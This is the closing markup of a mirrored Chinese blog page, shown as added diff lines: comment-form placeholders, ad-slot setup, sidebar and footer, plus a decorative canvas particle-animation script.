+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div id='comment_form' class='commentform'>
+<a name='commentform'></a>
+<div id='divCommentShow'></div>
+<div id='comment_nav'><span id='span_refresh_tips'></span><a href='javascript:void(0);' onclick='return RefreshCommentList();' id='lnk_RefreshComments' runat='server' clientidmode='Static'>刷新评论</a><a href='#' onclick='return RefreshPage();'>刷新页面</a><a href='#top'>返回顶部</a></div>
+<div id='comment_form_container'></div>
+<div class='ad_text_commentbox' id='ad_text_under_commentbox'></div>
+<div id='ad_t2'></div>
+<div id='opt_under_post'></div>
+<script async='async' src='https://www.googletagservices.com/tag/js/gpt.js'></script>
+<script>
+  var googletag = googletag || {};
+  googletag.cmd = googletag.cmd || [];
+</script>
+<script>
+  googletag.cmd.push(function() {
+        googletag.defineSlot('/1090369/C1', [300, 250], 'div-gpt-ad-1546353474406-0').addService(googletag.pubads());
+        googletag.defineSlot('/1090369/C2', [468, 60], 'div-gpt-ad-1539008685004-0').addService(googletag.pubads());
+        googletag.pubads().enableSingleRequest();
+        googletag.enableServices();
+  });
+</script>
+<div id='cnblogs_c1' class='c_ad_block'>
+    <div id='div-gpt-ad-1546353474406-0' style='height:250px; width:300px;'></div>
+</div>
+<div id='under_post_news'></div>
+<div id='cnblogs_c2' class='c_ad_block'>
+    <div id='div-gpt-ad-1539008685004-0' style='height:60px; width:468px;'></div>
+</div>
+<div id='under_post_kb'></div>
+<div id='HistoryToday' class='c_ad_block'></div>
+<script type='text/javascript'>
+ if(enablePostBottom()) {
+    codeHighlight();
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverT2();
+    deliverC1();
+    deliverC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);  
+}
+</script>
+</div>
+
+    
+	</div><!--end: forFlow -->
+	</div><!--end: mainContent 主体内容容器-->
+
+	<div id="sideBar">
+		<div id="sideBarMain">
+			
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+	<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+
+			<div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script>
+			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+			</div>
+			
+		</div><!--end: sideBarMain -->
+	</div><!--end: sideBar 侧边栏容器 -->
+	<div class="clear"></div>
+	</div><!--end: main -->
+	<div class="clear"></div>
+	<div id="footer">
+		
+<!--done-->
+Copyright &copy;2019 疏桐
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+
+<!--PageEndHtml Block Begin-->
+<script>
+ 
+!function(){
+ 
+ function n(n,e,t){
+ 
+ return n.getAttribute(e)||t
+ 
+ }
+ 
+ function e(n){
+ 
+ return document.getElementsByTagName(n)
+ 
+ }
+ 
+ function t(){
+ 
+ var t=e("script"),o=t.length,i=t[o-1];
+ 
+ return{
+ 
+ l:o,z:n(i,"zIndex",-1),o:n(i,"opacity",.5),c:n(i,"color","0,0,0"),n:n(i,"count",99)
+ 
+ }
+ 
+ }
+ 
+ function o(){
+ 
+ a=m.width=window.innerWidth||document.documentElement.clientWidth||document.body.clientWidth,
+ 
+ c=m.height=window.innerHeight||document.documentElement.clientHeight||document.body.clientHeight
+ 
+ }
+ 
+ function i(){
+ 
+ r.clearRect(0,0,a,c);
+ 
+ var n,e,t,o,m,l;
+ 
+ s.forEach(function(i,x){
+ 
+ for(i.x+=i.xa,i.y+=i.ya,i.xa*=i.x>a||i.x<0?-1:1,i.ya*=i.y>c||i.y<0?-1:1,r.fillRect(i.x-.5,i.y-.5,1,1),e=x+1;e<u.length;e++)n=u[e],
+ 
+ null!==n.x&&null!==n.y&&(o=i.x-n.x,m=i.y-n.y,
+ 
+ l=o*o+m*m,l<n.max&&(n===y&&l>=n.max/2&&(i.x-=.03*o,i.y-=.03*m),
+ 
+ t=(n.max-l)/n.max,r.beginPath(),r.lineWidth=t/2,r.strokeStyle="rgba("+d.c+","+(t+.2)+")",r.moveTo(i.x,i.y),r.lineTo(n.x,n.y),r.stroke()))
+ 
+ }),
+
+ x(i)
+ 
+ }
+ 
+ var a,c,u,m=document.createElement("canvas"),
+ 
+ d=t(),l="c_n"+d.l,r=m.getContext("2d"),
+x=window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||
+ 
+ function(n){
+
+ window.setTimeout(n,1e3/45)
+ 
+ },
+ 
+ w=Math.random,y={x:null,y:null,max:2e4};m.id=l,m.style.cssText="position:fixed;top:0;left:0;z-index:"+d.z+";opacity:"+d.o,e("body")[0].appendChild(m),o(),window.onresize=o,
+ 
+ window.onmousemove=function(n){
+ 
+ n=n||window.event,y.x=n.clientX,y.y=n.clientY
+ 
+ },
+ 
+ window.onmouseout=function(){
+ 
+ y.x=null,y.y=null
+ 
+ };
+ 
+ for(var s=[],f=0;d.n>f;f++){
+ 
+ var h=w()*a,g=w()*c,v=2*w()-1,p=2*w()-1;s.push({x:h,y:g,xa:v,ya:p,max:6e3})
+ 
+ }
+ 
+ u=s.concat([y]),
+ 
+ setTimeout(function(){i()},100)
+ 
+ }();
+ 
+ </script>
+<!--PageEndHtml Block End-->
+</body>
+
+<!-- Mirrored from www.cnblogs.com/xinxianquan/p/8824167.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 09 Jun 2019 01:25:43 GMT -->
+</html>
